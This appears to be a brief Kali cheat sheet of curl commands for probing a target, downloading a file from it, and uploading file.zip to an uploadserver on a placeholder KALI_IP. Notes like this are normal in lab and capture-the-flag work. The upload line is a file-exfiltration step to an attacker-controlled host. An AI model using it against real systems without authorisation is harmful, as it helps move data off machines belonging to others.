## Commands

**Kali**

```bash
curl -I http://TARGET_IP/
curl -o file.zip http://TARGET_IP:8000/file.zip
curl -X POST http://KALI_IP:8000/upload -F 'files=@file.zip'
```

The upload command requires an uploadserver endpoint, not Python http.server.
